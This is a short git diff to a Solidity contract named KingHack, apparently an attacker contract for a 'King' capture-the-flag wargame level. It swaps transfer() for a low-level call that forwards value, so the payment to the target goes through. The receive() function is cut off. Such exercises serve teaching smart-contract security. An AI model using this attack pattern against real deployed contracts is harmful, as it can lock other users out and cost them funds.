@@ -5,7 +5,8 @@ import "../king/King.sol";
 
 contract KingHack {
     function sendPayment(address king) external payable {
-        payable(king).transfer(msg.value);
+        (bool success, ) = payable(address(king)).call{value: msg.value}("");
+        require(success, "External call failed");
     }
 
     receive () external payable {
